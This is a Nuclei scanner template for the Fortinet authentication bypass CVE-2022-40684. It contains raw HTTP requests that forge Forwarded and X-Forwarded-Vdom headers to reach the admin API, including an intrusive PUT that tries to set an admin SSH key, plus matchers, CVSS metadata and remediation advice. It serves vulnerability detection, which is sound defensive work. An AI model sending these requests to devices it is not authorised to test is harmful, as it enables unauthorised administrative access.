http:
- matchers:
  - condition: and
    part: body_1
    type: word
    words:
    - ENC XXXX
    - http_method
  - condition: and
    part: body_2
    type: word
    words:
    - Invalid SSH public key.
    - cli_error
  matchers-condition: or
  raw:
  - 'GET /api/v2/cmdb/system/admin HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Node.js

    Forwarded: by="[127.0.0.1]:1337";for="[127.0.0.1]:1337";proto=http;host=

    X-Forwarded-Vdom: root

    '
  - "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Report Runner\nContent-Type: application/json\nForwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;\n\
    Content-Length: 610\n\n {\n  \"ssh-public-key1\":\"{{randstr}}\"\n}\n"
  stop-at-first-match: true
id: CVE-2022-40684
info:
  author: Shockwave,nagli,carlosvieira
  classification:
    cpe: cpe:2.3:a:fortinet:fortiproxy:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-40684
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.9998
    epss-score: 0.94427
  description: 'Fortinet contains an authentication bypass vulnerability via using
    an alternate path or channel in FortiOS 7.2.0 through 7.2.1 and 7.0.0 through
    7.0.6, FortiProxy 7.2.0 and 7.0.0 through 7.0.6, and FortiSwitchManager 7.2.0
    and 7.0.0. An attacker can perform operations on the administrative interface
    via specially crafted HTTP or HTTPS requests, thus making it possible to obtain
    sensitive information, modify data, and/or execute unauthorized operations.

    '
  impact: 'Successful exploitation of this vulnerability allows an attacker to bypass
    authentication and gain unauthorized access to the affected device.

    '
  metadata:
    max-request: 2
    product: fortiproxy
    vendor: fortinet
  name: Fortinet - Authentication Bypass
  reference:
  - https://github.com/horizon3ai/CVE-2022-40684/blob/master/CVE-2022-40684.py
  - https://securityonline.info/researchers-have-developed-cve-2022-40684-poc-exploit-code/
  - https://socradar.io/what-do-you-need-to-know-about-fortinet-critical-authentication-bypass-vulnerability-cve-2022-40684/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40684
  - https://nvd.nist.gov/vuln/detail/CVE-2022-40684
  remediation: 'Apply the necessary security patches or firmware updates provided
    by Fortinet to mitigate this vulnerability.

    '
  severity: critical
  tags: cve,cve2022,fortinet,fortigate,fortios,fortiproxy,auth-bypass,kev,intrusive,vkev,vuln
